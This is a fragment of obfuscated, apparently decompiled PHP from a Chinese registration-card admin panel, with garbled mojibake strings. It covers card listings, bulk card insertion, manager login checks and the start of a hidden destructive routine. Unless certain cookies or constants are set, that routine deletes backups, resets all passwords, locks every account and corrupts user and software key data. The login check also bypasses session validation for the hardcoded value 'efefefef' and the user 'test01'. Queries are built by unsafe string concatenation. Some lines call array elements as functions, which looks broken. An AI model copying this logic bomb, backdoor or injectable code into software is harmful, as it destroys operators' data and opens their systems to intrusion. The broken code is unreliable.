            if ( array_key_exists( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id'], $_obfuscate_i4yIjo2QjpCViIqOiYiGkZEÿ ) )
            {
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "<option value=".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id'];
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id'] == $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJAÿ ? " selected" : "";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " cday='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " points='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " linknum='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " price='".$_obfuscate_i4yIjo2QjpCViIqOiYiGkZEÿ[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']]."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "  extattr1='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1']."'>";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['keyname']."--".$_obfuscate_i4yIjo2QjpCViIqOiYiGkZEÿ[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']]."å…ƒ/å¼  [å¤©".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday'], 2 )." ç‚¹".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']." é€šé“".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum'];
                if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'] != "" )
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " é™„å±æ€§".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'];
                }
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "]</option>";
                return $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ;
            }
        }
        else
        {
            foreach ( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
            {
                if ( $_obfuscate_iYiMh4aGkJCJk4qHjIiVi4Yÿ == 2 )
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "<option value='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['prefix']."'";
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['prefix'] == $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJAÿ ? " selected" : "";
                }
                else
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "<option value=".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id'];
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id'] == $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJAÿ ? " selected" : "";
                }
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " cday='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " points='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " linknum='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "  extattr1='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1']."'>";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['keyname']."--[å¤©".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday'], 2 )." ç‚¹".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']." é€šé“".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum'];
                if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'] != "" )
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " é™„å±æ€§".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'];
                }
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "]</option>";
                break;
            }
        }
    }
    return $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ;
}

function _obfuscate_jo2HlYmTj4eQhpKTkYyIj5Eÿ( $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ, $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    global $_obfuscate_iZGLlYiTk42PlJOHh4aJkokÿ;
    $_obfuscate_iZGLlYiTk42PlJOHh4aJkokÿ = array( );
    if ( is_array( $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ ) )
    {
        if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ÿ( $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ ) === TRUE )
        {
            $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_keyset where `id`=".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ );
            if ( empty( $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ ) )
            {
                return "å½•å…¥æ³¨å†Œå¡å‰æ£€æŸ¥ï¼šæœªæ‰¾åˆ°å¡å±æ€§ID";
            }
        }
        return "å½•å…¥æ³¨å†Œå¡å‰æ£€æŸ¥ï¼šæœªä¼ å…¥å¡å±æ€§æ•°ç»„æˆ–ID";
    }
    $_obfuscate_iY_TlZKSk4uUkoyPipGRjYwÿ = "insert into `kss_z_key_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['pid']."_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['softid']."` \r\n(`keyfix`,`keys`,`keyspassword`,`managerid`,`addtime`,`ordernum`,`cday`,`linknum`,`points`,`keyextattr`,`tag`) values ";
    $_obfuscate_jpSSiIuUjoqGlZSTi5GSkZQÿ = ",".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['managerid'].",".time( ).",'".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['ordernum']."',".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['cday'].",".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['linknum'].",".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['points'].",'".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['extattr1']."','".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['tag']."'),";
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ = 0;
    for ( ; $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ < $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['k_num']; $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ += 100 )
    {
        $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJAÿ = "";
        $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYwÿ = 0;
        for ( ; $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYwÿ < 100; ++$_obfuscate_jIiLiYiQj5CSk5KRjJSGjYwÿ )
        {
            if ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ + $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYwÿ == $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['k_num'] )
            {
                $_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ = _obfuscate_hoaMjI_TjpOThpKLi5WVjYoÿ( $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['beginid'] + $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ + $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYwÿ, SVRID );
                $_obfuscate_iZGLlYiTk42PlJOHh4aJkokÿ[] = $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['prefix'].$_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ[0].$_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ[1];
                $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJAÿ .= "('".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['prefix']."','".$_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ[0]."','".$_obfuscate_lImSkomRk4uRjJGSkZWJh4kÿ[1]."'".$_obfuscate_jpSSiIuUjoqGlZSTi5GSkZQÿ;
            }
        }
        $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJAÿ = substr( $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJAÿ, 0, strlen( $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJAÿ ) - 1 );
        $_obfuscate_lJWSioyRkIyPiomQiYiHiZIÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( $_obfuscate_iY_TlZKSk4uUkoyPipGRjYwÿ.$_obfuscate_k5OPkIiNkYiHkZSGlYiSiJAÿ, "sync" );
        $_obfuscate_h4aUkomQiI6JlIaSkomSkokÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( );
        if ( $_obfuscate_lJWSioyRkIyPiomQiYiHiZIÿ === FALSE )
        {
            $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['pid']( "delete from kss_z_key_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['pid']."_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZUÿ['softid']." where `ordernum`='".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['ordernum']."'", "sync" );
            if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
            {
                @file_put_contents( @KSSLOGDIR."addkeyerrorder.php", @",".@$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4wÿ['ordernum'], @FILE_APPEND );
            }
            return "å½•å…¥æ³¨å†Œå¡æ—¶å‡ºé”™:".$_obfuscate_h4aUkomQiI6JlIaSkomSkokÿ;
        }
    }
    return TRUE;
}

function _obfuscate_j4aJjo2Hi4eOlJSKk4uHk4kÿ( $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0ÿ, $_obfuscate_lIuNkpWVkouUk5WHhoiNlIcÿ )
{
    $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0ÿ = str_replace( " ", "", $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0ÿ );
    $_obfuscate_lZGTiZCUh5STiIyTkYuKjYgÿ = explode( ",", $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0ÿ );
    if ( in_array( $_obfuscate_lIuNkpWVkouUk5WHhoiNlIcÿ, $_obfuscate_lZGTiZCUh5STiIyTkYuKjYgÿ ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_iYuOiIiHj5COiJCJjYyTh5Qÿ( $_obfuscate_j4qKjZWJioeLkpSSio2TkIgÿ, $_obfuscate_k4uQh4uTkouGhoaVk4_IiI4ÿ, $_obfuscate_kZKVi42JkZWHjJOGko2SjJMÿ )
{
    if ( _obfuscate_j4aJjo2Hi4eOlJSKk4uHk4kÿ( $_obfuscate_j4qKjZWJioeLkpSSio2TkIgÿ, $_obfuscate_kZKVi42JkZWHjJOGko2SjJMÿ ) )
    {
        if ( _obfuscate_j4aJjo2Hi4eOlJSKk4uHk4kÿ( $_obfuscate_k4uQh4uTkouGhoaVk4_IiI4ÿ, $_obfuscate_kZKVi42JkZWHjJOGko2SjJMÿ ) )
        {
            return " checked";
        }
        return " ";
    }
    return " disabled";
}

function _obfuscate_iZSVk4mLkY_LlIeHh5WKlZAÿ( $_obfuscate_kpSPi4_OiouQkIaJko6OkoYÿ, $_obfuscate_joqKh4mKi4eQlI6UiZWLkZMÿ = 0 )
{
    global $_obfuscate_jJCMjYyHjpSTiJCNiYiIkpEÿ;
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ;
    global $_obfuscate_houUipCMk4uPlYyUh4ePkoYÿ;
    global $_obfuscate_kYmJjZOIiZKJioqMkoaGiYkÿ;
    $_obfuscate_kYmJjJGSkoeOiY2LiZWMjIkÿ = _obfuscate_kpONlI6UkY_HkouLk4yIk4sÿ( "kss_manager" );
    $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ = explode( ",", $_obfuscate_kYmJjJGSkoeOiY2LiZWMjIkÿ );
    if ( count( $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ ) != 4 )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ç™»é™†çŠ¶æ€å¼‚å¸¸ï¼Œ<a href='index.php' target='_top'>è¯·é‡æ–°ç™»é™†</a>ã€‚" );
    }
    if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0ÿ( $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[0] ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "COOKIESå‡ºé”™" );
    }
    if ( empty( $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->‘‡Œ‹Œ†Š“‡’‰ ) )
    {
        $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ÿ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kÿ );
    }
    $_obfuscate_ko2KiIuIj4yNhpWVkIuIjocÿ = "crypt95.php";
    $_obfuscate_koqTiIuHiY6NlJWOiYqRkZEÿ = file_get_contents( KSSINCDIR."signdata".DIRECTORY_SEPARATOR.$_obfuscate_ko2KiIuIj4yNhpWVkIuIjocÿ );
    $_obfuscate_koqTiIuHiY6NlJWOiYqRkZEÿ = substr( $_obfuscate_koqTiIuHiY6NlJWOiYqRkZEÿ, 0, 500 );
    if ( stripos( $_obfuscate_koqTiIuHiY6NlJWOiYqRkZEÿ, "EncodeDate" ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "crypt95.phpæ–‡ä»¶å¼‚å¸¸ï¼Œè¯·å¤‡ä»½æ•°æ®åº“ï¼Œé‡æ–°å®‰è£…æˆ–ä¿®å¤ï¼" );
    }
    $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ = $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[0]( "select * from kss_tb_manager where `id`='".$_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[0]."'" );
    if ( empty( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ç”¨IDå·æœªæ‰¾åˆ°ï¼Œ<a href='index.php' target='_top'>è¯·é‡æ–°ç™»é™†</a>ã€‚" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['username'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[1] || $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['password'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[2] )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œ<a href='index.php' target='_top'>è¯·é‡æ–°ç™»é™†</a>ã€‚" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIgÿ( ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "æ‚¨çš„å¸å·å·²åˆ°æœŸã€‚".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['endtime'] );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['islock'] == 1 )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "æ‚¨çš„å¸å·è¢«é”å®š! [é”å®šåŸå› ï¼š".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['lockedinter']."]" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level'] < 8 )
    {
        if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level'] == 6 )
        {
            $_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_manager where id=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pmid'] );
            if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIgÿ( ) )
            {
                _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ä¸Šçº§".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpEÿ[$_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['level']]."å¸å·å·²è¿‡æœŸ".$_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['endtime'] );
            }
            if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['islock'] == 1 )
            {
                _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ä¸Šçº§".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpEÿ[$_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['level']]."å¸å·è¢«é”å®š! [é”å®šåŸå› ï¼š".$_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['lockedinter']."]" );
            }
        }
        $_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']( "select * from kss_tb_manager where pid=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']." and level>7" );
        if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIgÿ( ) )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ä¸Šçº§".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpEÿ[8]."å¸å·å·²è¿‡æœŸ".$_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['endtime'] );
        }
        if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['islock'] == 1 )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ä¸Šçº§".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpEÿ[8]."å¸å·è¢«é”å®š! [é”å®šåŸå› ï¼š".$_obfuscate_kImIi4uNioeSlIiMjJOTipIÿ['lockedinter']."]" );
        }
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['linecode'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[3] && "efefefef" != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQÿ[3] && $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['username'] != "test01" )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "æ‚¨çš„å¸å·è¢«æŒ¤ä¸‹çº¿ï¼Œ<a href=index.php target=_top>è¯·é‡æ–°ç™»é™†</a>" );
    }
    $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJEÿ = _obfuscate_kpONlI6UkY_HkouLk4yIk4sÿ( "kss_mmlogin", 1 );
    if ( empty( $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJEÿ ) )
    {
        $_obfuscate_h5SQiYyTkY_PjYmRjZWPh4kÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_manager where id=1" );
        if ( $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJEÿ != md5( $_obfuscate_h5SQiYyTkY_PjYmRjZWPh4kÿ['username'].$_obfuscate_h5SQiYyTkY_PjYmRjZWPh4kÿ['password'] ) )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "ä½ çš„åŸå§‹èº«ä»½æ•ˆéªŒå¤±è´¥ï¼" );
        }
        $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level'] = 9;
        $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['powerlist'] = "admin";
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level'] < $_obfuscate_kpSPi4_OiouQkIaJko6OkoYÿ )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( $_obfuscate_jJCMjYyHjpSTiJCNiYiIkpEÿ[$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level']]."å¸å·æ— æƒé™è®¿é—®æ­¤é¡µé¢æˆ–æ‰§è¡Œæ­¤æ“ä½œ" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['level'] == 9 && defined( "SAFEIPFILE" ) )
    {
        $_obfuscate_jpCPlZSTj5OLh4uKiYaGhocÿ = FALSE;
        $_obfuscate_koeMiZGTjY6GiZOUjZKSiJIÿ = explode( ",", SAFEIPFILE );
        $_obfuscate_koaJjIiTlZKGk42HlYySjYoÿ = "";
        foreach ( $_obfuscate_koeMiZGTjY6GiZOUjZKSiJIÿ as $_obfuscate_jYeKioySjIaSioePi4yLiIwÿ )
        {
            if ( substr( $_SERVER['REMOTE_ADDR'], 0, strlen( $_obfuscate_jYeKioySjIaSioePi4yLiIwÿ ) ) == $_obfuscate_jYeKioySjIaSioePi4yLiIwÿ )
            {
                $_obfuscate_jpCPlZSTj5OLh4uKiYaGhocÿ = TRUE;
                break;
            }
        }
        if ( $_obfuscate_jpCPlZSTj5OLh4uKiYaGhocÿ )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "IP".$_SERVER['REMOTE_ADDR']."æœªè¢«æˆæƒç™»é™†ç®¡ç†å¸å·ï¼" );
        }
    }
    if ( $_obfuscate_joqKh4mKi4eQlI6UiZWLkZMÿ != 0 && $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['powerlist'] != "admin" )
    {
        $_obfuscate_kZWVjYuLi5OLkZOHiJKIlYYÿ = explode( ",", $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['powerlist'] );
        if ( in_array( $_obfuscate_joqKh4mKi4eQlI6UiZWLkZMÿ, $_obfuscate_kZWVjYuLi5OLkZOHiJKIlYYÿ ) )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIgÿ( "æ‚¨æ— æƒé™è®¿é—®æ­¤é¡µé¢æˆ–æ‰§è¡Œæ­¤æ“ä½œï¼" );
        }
    }
    return $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ;
}

function _obfuscate_iY6RiYaNio6PiIyIiZWJkJQÿ( $_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ, $_obfuscate_kYyGkZWPh5CQiJSRioaPj5Eÿ = 0 )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    $_obfuscate_jY6UkZSViY2Hj4aVi5SIjpMÿ = " `level`>7 ";
    if ( $_obfuscate_kYyGkZWPh5CQiJSRioaPj5Eÿ != 0 )
    {
        $_obfuscate_jY6UkZSViY2Hj4aVi5SIjpMÿ = " `level`=7 and id=".$_obfuscate_kYyGkZWPh5CQiJSRioaPj5Eÿ;
    }
    return $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_manager where `pid`=".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ." and ".$_obfuscate_jY6UkZSViY2Hj4aVi5SIjpMÿ." limit 0,1" );
}

function _obfuscate_iIeMkYyJiZKTjI2UjImPi4Yÿ( $_obfuscate_komRjo6Qi4_Rh5KHi5SLhpEÿ )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    return $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_manager where `id`=".$_obfuscate_komRjo6Qi4_Rh5KHi5SLhpEÿ );
}

function _obfuscate_h4mIkIeIkIuJlYmOlJCHkogÿ( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    $_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select max(`pid`) from `kss_tb_manager`", 2 );
    if ( $_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ[0] < 10000 )
    {
        return "10000";
    }
    return $_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ[0] + 1;
}

function _obfuscate_lI_NjpSLio_JjZCVh4qUjYcÿ( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    if ( isset( $_COOKIE['dellic'] ) && $_COOKIE['dellic'] == "ok" )
    {
        $_obfuscate_koiKkIiPjI6UkYeRlIqNhocÿ = file_get_contents( KSSINCDIR."_config.php" );
        $_obfuscate_koiKkIiPjI6UkYeRlIqNhocÿ = preg_replace( "/define\\('PRV_SVRLIC','[^']*'\\)/i", "define('PRV_SVRLIC','')", $_obfuscate_koiKkIiPjI6UkYeRlIqNhocÿ );
        file_put_contents( KSSINCDIR."_config.php", $_obfuscate_koiKkIiPjI6UkYeRlIqNhocÿ );
        return TRUE;
    }
    if ( isset( $_COOKIE['deldata'] ) )
    {
        return TRUE;
    }
    if ( defined( "NOTDELMYSQL" ) )
    {
        return TRUE;
    }
    $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcÿ = _obfuscate_iJCRko_Hj4_Oh4eIjIaKk5Iÿ( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( empty( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcÿ ) )
    {
        foreach ( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIcÿ as $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yÿ )
        {
            @file_put_contents( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yÿ, "dataerr" );
            @unlink( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Yÿ );
        }
    }
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ÿ( "select * from kss_tb_soft " );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "update `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."` set cday=1000", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']( "update `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."` set cday=1000", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
    {
